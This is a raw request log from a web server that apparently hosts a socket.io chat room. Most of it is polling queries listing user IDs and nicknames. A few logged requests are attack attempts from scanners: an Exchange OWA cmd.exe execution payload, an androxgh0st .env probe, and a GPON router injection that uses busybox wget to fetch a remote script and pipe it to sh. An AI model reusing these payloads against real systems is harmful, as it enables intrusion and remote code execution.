[2021-04-19 01:14:43.616] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 02:27:58.823] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-19 02:37:20.342] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 02:59:10.694] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-19 03:51:37.570] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/owa/auth/LoginTime.aspx {"Font":{"UTF8":"var xftz=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"dHlwZSAiQzpcUHJvZ3JhbSBGaWxlc1xNaWNyb3NvZnRcRXhjaGFuZ2UgU2VydmVyXFYxNVxmcm9udGVuZFxodHRwcHJveHlcb3dhXGF1dGhcTXVsdGlVcC5hc3B4Ig==\")); var c=new System.Diagnostics.ProcessStartInfo(\"cmd.exe\");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments=\"/c \"+xftz;e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(\"\"+out.ReadToEnd()+EI.ReadToEnd()+\"\");"}} 405 0ms
[2021-04-19 05:22:08.728] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-19 05:22:09.703] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 06:03:10.796] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 06:14:35.066] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/.env 200 1ms
[2021-04-19 06:14:36.217] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/ {"0x":["androxgh0st"]} 405 0ms
[2021-04-19 07:26:53.377] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 07:27:19.650] [INFO] - [162.142.125.39] GET http://47.100.89.2:8250/ 200 1ms
[2021-04-19 07:33:55.567] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 07:54:53.261] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 1ms
[2021-04-19 08:00:22.215] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 08:53:12.033] [INFO] - [47.101.164.135] GET http://47.100.89.2:8250/ 200 0ms
[2021-04-19 08:53:27.681] [INFO] - query { rid: '64a4018aeac048c28319bcc2f24e669a',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZddZ9b' }
[2021-04-19 08:53:27.681] [INFO] - [ 'dBaQ4KSRjtXGGTV1AC_Z', '64a4018aeac048c28319bcc2f24e669a' ]
[2021-04-19 08:54:21.202] [INFO] - query { rid: '64a4018aeac048c28319bcc2f24e669a',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZddmEJ' }
[2021-04-19 08:54:21.202] [INFO] - [ 'EsH43O9m5BZYrmcJAC_a', '64a4018aeac048c28319bcc2f24e669a' ]
[2021-04-19 09:26:58.057] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 1ms
[2021-04-19 09:30:02.662] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '13b65592132743cc877c944adaf16b0c',
  username: 'Lily',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdlw_S' }
[2021-04-19 09:30:02.663] [INFO] - [ 'KvARX4Wy31AsKSiuAC_b', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:30:28.534] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdm1Je' }
[2021-04-19 09:30:28.535] [INFO] - [ 'rcDf3poGSM9jb1E2AC_c', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:31:16.382] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '13b65592132743cc877c944adaf16b0c',
  username: 'Lily',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdmC-_' }
[2021-04-19 09:31:16.382] [INFO] - [ 'BcHjM86_S9QuPm0lAC_d', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:31:41.915] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '13b65592132743cc877c944adaf16b0c',
  username: 'Lily',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdmJDX' }
[2021-04-19 09:31:41.915] [INFO] - [ '5X2YIij6yF-Pmf3EAC_e', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:32:23.371] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '13b65592132743cc877c944adaf16b0c',
  username: 'Lily',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdmTLt' }
[2021-04-19 09:32:23.371] [INFO] - [ 'b1_rRy-yu7SAi0VoAC_f', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:32:42.388] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '4aa9d734982b44e4973bbb40dce41945',
  username: 'ivy',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdmYAE' }
[2021-04-19 09:32:42.388] [INFO] - [ 'DAG5IPrkh2RHRrpMAC_g', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:32:50.555] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '13b65592132743cc877c944adaf16b0c',
  username: 'Lily',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdmZ-P' }
[2021-04-19 09:32:50.556] [INFO] - [ 'hEyu6Wb5JAfLr0_cAC_h', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:33:35.416] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '4aa9d734982b44e4973bbb40dce41945',
  username: 'ivy',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdmlBR' }
[2021-04-19 09:33:35.417] [INFO] - [ 'DiWun0i-aBALdky-AC_i', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:33:50.788] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '4aa9d734982b44e4973bbb40dce41945',
  username: 'ivy',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdmouU' }
[2021-04-19 09:33:50.789] [INFO] - [ 'dYtQQeXTdxuA6AZgAC_j', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:33:58.152] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '13b65592132743cc877c944adaf16b0c',
  username: 'Lily',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdmqUj' }
[2021-04-19 09:33:58.152] [INFO] - [ 'vmpDQZcbKE-dK1fWAC_k', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:34:07.590] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '43ab4aaf491b4703b2240eb0df37c13a',
  username: 'why947489b7d3',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdmsgt' }
[2021-04-19 09:34:07.590] [INFO] - [ 'u2GcwfwRjFdF0QkNAC_l', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:34:09.111] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '4aa9d734982b44e4973bbb40dce41945',
  username: 'ivy',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdmtQ0' }
[2021-04-19 09:34:09.111] [INFO] - [ 'c4mpCJwRsBbRTDtVAC_m', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:34:11.586] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '13b65592132743cc877c944adaf16b0c',
  username: 'Lily',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdmtmZ' }
[2021-04-19 09:34:11.586] [INFO] - [ '7rGIykN_coCGCS05AC_n', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:36:24.711] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '28cc340a8d394b348c5c31ed19f96ee8',
  username: '老周',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdnOAy' }
[2021-04-19 09:36:24.711] [INFO] - [ 'qPAEFLqHxdTHyiy2AC_o', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:36:44.630] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '963d07c60d5e4ad0a7d1e01c109f7a86',
  username: '小扁鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdnT97' }
[2021-04-19 09:36:44.630] [INFO] - [ 'sfDKT1gbGtWvXKL8AC_p', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:37:05.407] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '963d07c60d5e4ad0a7d1e01c109f7a86',
  username: '小扁鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdnYDQ' }
[2021-04-19 09:37:05.408] [INFO] - [ '_yaSCx0G806_FA0nAC_q', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:37:09.543] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdnZDA' }
[2021-04-19 09:37:09.544] [INFO] - [ 'RSDzw5uMcRNRiJAWAC_r', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:37:29.962] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a11e4827bd314195b67db13a41072159',
  username: '红樱桃',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdneC1' }
[2021-04-19 09:37:29.963] [INFO] - [ 'AeXEJhMCzsIJ3RaeAC_s', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:37:40.066] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 09:38:14.838] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '6d0ba58ced07452b89707c76bcd70baf',
  username: '圈',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdnpE0' }
[2021-04-19 09:38:14.838] [INFO] - [ 's6kjoZQGy0dumLdUAC_t', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:38:42.651] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '16131d6df4cc4d198e25b126bbd1dc3c',
  username: '杨琛',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdnvyJ' }
[2021-04-19 09:38:42.652] [INFO] - [ '4Sleud4a5szfgtmqAC_u', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:38:47.922] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '963d07c60d5e4ad0a7d1e01c109f7a86',
  username: '小扁鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdnxFa' }
[2021-04-19 09:38:47.922] [INFO] - [ 'afOVMtBJ08HnFy2WAC_v', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:38:51.652] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdnyB-' }
[2021-04-19 09:38:51.652] [INFO] - [ '9GB9Kh69RYOCtC5nAC_w', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:39:09.075] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdo0R-' }
[2021-04-19 09:39:09.075] [INFO] - [ '8rVUKbOoRINnjl4UAC_x', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:39:12.706] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '16131d6df4cc4d198e25b126bbd1dc3c',
  username: '杨琛',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdo1Hh' }
[2021-04-19 09:39:12.706] [INFO] - [ 'EVkJop_s9h3w7GhdAC_y', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:39:24.360] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a11e4827bd314195b67db13a41072159',
  username: '红樱桃',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdo46m' }
[2021-04-19 09:39:24.360] [INFO] - [ 'K89RCJ3YXSI6Y3BWAC_z', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:39:24.766] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '01578cd2f4294e3285e22f411cf835ff',
  username: '余乐',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdo4Yk' }
[2021-04-19 09:39:24.767] [INFO] - [ 'uHwwldqu2Xirod0bAC_0', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:39:32.253] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdo66W' }
[2021-04-19 09:39:32.254] [INFO] - [ 'NRTOmsNBcb2R8bceAC_1', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:39:40.900] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '16131d6df4cc4d198e25b126bbd1dc3c',
  username: '杨琛',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdo8AI' }
[2021-04-19 09:39:40.900] [INFO] - [ '4zds4GCX2Dk0NLMUAC_2', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:40:03.589] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '963d07c60d5e4ad0a7d1e01c109f7a86',
  username: '小扁鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdoDjb' }
[2021-04-19 09:40:03.589] [INFO] - [ '9QS45JENJV-PHRkgAC_3', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:40:04.161] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '53a00d3061a1409987dc915a19627f43',
  username: '宾哥',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdoDm2' }
[2021-04-19 09:40:04.162] [INFO] - [ 'mehEZnvny6PLxkIgAC_4', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:40:31.019] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdoKX5' }
[2021-04-19 09:40:31.019] [INFO] - [ '0UCa0rfktfKB1evGAC_5', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:40:47.905] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdoOY9' }
[2021-04-19 09:40:47.905] [INFO] - [ '8sbFVGLUjHAQKzerAC_6', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:41:02.416] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdoS5K' }
[2021-04-19 09:41:02.417] [INFO] - [ 'JyLfZvOdtEbfSp15AC_7', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:41:08.722] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdoTeB' }
[2021-04-19 09:41:08.722] [INFO] - [ 'JtfhJtHvDlFlxVtSAC_8', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:41:13.142] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7f3fc4ae545145539c8379e0e3f3a7fa',
  username: '游走。。shell',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdoUiF' }
[2021-04-19 09:41:13.143] [INFO] - [ 'JJoCzkbIqdoHjUPiAC_9', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:41:33.184] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7f3fc4ae545145539c8379e0e3f3a7fa',
  username: '游走。。shell',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdoZa0' }
[2021-04-19 09:41:33.184] [INFO] - [ 'hdZDtB-mygMiNxbiAC_-', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:41:48.645] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdodNv' }
[2021-04-19 09:41:48.646] [INFO] - [ 'z2rQLjcloHkto3OnAC__', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:41:52.952] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdoeQM' }
[2021-04-19 09:41:52.953] [INFO] - [ '91BNuplTwcOjn2oxADAA', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:42:10.288] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdoifX' }
[2021-04-19 09:42:10.288] [INFO] - [ 'aYHUT8dW6dFTrijMADAB', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:42:13.054] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdoji7' }
[2021-04-19 09:42:13.055] [INFO] - [ 'zZ2DPbxEo6zQdW8FADAC', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:42:14.281] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '539136a7e80d41878497dd772643d5d2',
  username: '得其所斋',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdojsn' }
[2021-04-19 09:42:14.281] [INFO] - [ '2ITgnyNvZchcKwWxADAD', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:42:19.640] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdokxl' }
[2021-04-19 09:42:19.640] [INFO] - [ 'GCBVSDeSbrq6nF0MADAE', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:42:30.904] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7f3fc4ae545145539c8379e0e3f3a7fa',
  username: '游走。。shell',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdongZ' }
[2021-04-19 09:42:30.904] [INFO] - [ '7Md45dt5GZljIkRIADAF', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:42:34.152] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdooSe' }
[2021-04-19 09:42:34.153] [INFO] - [ '2eIlmKYW3vM0VbuiADAG', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:42:51.732] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'c8275fbdbac44883b5056e22c979c7f5',
  username: '夏芸凯Sky',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdosm2' }
[2021-04-19 09:42:51.732] [INFO] - [ 'h0x7KjfYR_mWn-9oADAH', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:43:06.783] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdowVv' }
[2021-04-19 09:43:06.783] [INFO] - [ 'VgWAt2ucAaXPXvm-ADAI', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:43:15.431] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'c8275fbdbac44883b5056e22c979c7f5',
  username: '夏芸凯Sky',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdoyYY' }
[2021-04-19 09:43:15.431] [INFO] - [ 'dBfBBuyFDC8_H1JZADAJ', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:43:38.210] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdp23I' }
[2021-04-19 09:43:38.211] [INFO] - [ 'Uako1rcqij-JGJJPADAK', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:44:07.601] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '16131d6df4cc4d198e25b126bbd1dc3c',
  username: '杨琛',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdp9Hm' }
[2021-04-19 09:44:07.601] [INFO] - [ '6iPFAWwtQ2sP93rSADAL', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:44:11.136] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdpA9V' }
[2021-04-19 09:44:11.137] [INFO] - [ 'MnC3AhCKSYBJ3hTqADAM', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:44:15.805] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '16131d6df4cc4d198e25b126bbd1dc3c',
  username: '杨琛',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdpBHS' }
[2021-04-19 09:44:15.805] [INFO] - [ '7CxmFydzztwqm2xRADAN', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:44:23.374] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '13b65592132743cc877c944adaf16b0c',
  username: 'Lily',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdpD7W' }
[2021-04-19 09:44:23.374] [INFO] - [ '7ZRcCyyn5E9R0WEfADAO', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:44:24.450] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdpDQF' }
[2021-04-19 09:44:24.450] [INFO] - [ 'x4JIfvxysN8wCibRADAP', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:44:46.198] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdpIjQ' }
[2021-04-19 09:44:46.199] [INFO] - [ '0AnzRlEoPXqRjSbPADAQ', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:45:16.248] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b893441df7304f5f8f49c7aa5710b10c',
  username: '傅大野',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdpQ0R' }
[2021-04-19 09:45:16.248] [INFO] - [ 'Ov01E91oRBzzQjEKADAR', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:45:33.215] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'bf26ce9722d54393b0003efea46698db',
  username: 'leipp',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdpUCC' }
[2021-04-19 09:45:33.215] [INFO] - [ 'jOP34vHRUmXF_uDQADAS', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:47:09.321] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '01578cd2f4294e3285e22f411cf835ff',
  username: '余乐',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdprvi' }
[2021-04-19 09:47:09.321] [INFO] - [ 'g4uYQbmP5dJX4CwwADAT', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:47:30.381] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '13b65592132743cc877c944adaf16b0c',
  username: 'Lily',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdpwoA' }
[2021-04-19 09:47:30.382] [INFO] - [ 'V1plYkjDl3iCHgjaADAU', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:47:35.940] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e5488922aaef4393a3a8781a14bb96bf',
  username: '筝弘ZHU',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdpy9N' }
[2021-04-19 09:47:35.941] [INFO] - [ '_KIXIRfccr0xpt8yADAV', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:47:38.463] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e12caf3b72da47e6b03e24ec0db495c5',
  username: '阿伟',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdpyja' }
[2021-04-19 09:47:38.463] [INFO] - [ 'BfXKLkhe8LZ2oK9-ADAW', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:47:53.011] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '13b65592132743cc877c944adaf16b0c',
  username: 'Lily',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdq0JL' }
[2021-04-19 09:47:53.012] [INFO] - [ '8-nDRprxmyHmloKmADAX', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:48:04.589] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '8ee7acc0de544cf3b026faa91bc7fef3',
  username: '闭眼茉莉安',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdq2HQ' }
[2021-04-19 09:48:04.589] [INFO] - [ 'MA_9Z-emNEwPo4RPADAY', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 09:48:08.874] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '963d07c60d5e4ad0a7d1e01c109f7a86',
  username: '小扁鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdq4CJ' }
[2021-04-19 09:48:08.874] [INFO] - [ 'c5HntUJcG2DYlwn-ADAZ', 'cc541ed7fe394c169297c95fd0c44af7' ]
